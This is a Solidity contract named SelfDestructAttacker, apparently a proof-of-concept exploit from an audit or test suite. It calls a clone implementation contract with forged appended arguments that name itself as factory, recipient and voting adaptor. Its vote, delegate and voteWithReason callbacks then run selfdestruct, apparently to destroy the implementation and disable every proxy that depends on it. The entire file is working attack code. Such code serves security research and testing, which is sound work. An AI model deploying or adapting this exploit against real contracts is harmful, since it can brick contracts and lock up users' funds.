// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.23;

contract SelfDestructAttacker {
    function attack(address impl, bytes memory cdata) external {
        (bool success, bytes memory returnData) = impl.call(
            abi.encodePacked(
                cdata,
                bytes32(0),
                address(this),
                address(this),
                address(this),
                uint40(block.timestamp),
                uint40(block.timestamp + 1),
                uint40(0),
                uint256(1),
                uint16(109)
            )
        );
        if (!success) {
            assembly {
                revert(add(32, returnData), mload(returnData))
            }
        }
    }

    function votingAdaptor() external view returns (address) {
        return address(this);
    }

    function factory() external view returns (address) {
        return address(this);
    }

    function recipient() external view returns (address) {
        return address(this);
    }

    function balanceOf(address) external pure returns (uint256) {
        return 1;
    }

    function delegate(bytes calldata) external {
        selfdestruct(payable(address(0)));
    }

    function vote(bytes calldata) external {
        selfdestruct(payable(address(0)));
    }

    function voteWithReason(bytes calldata) external {
        selfdestruct(payable(address(0)));
    }
}
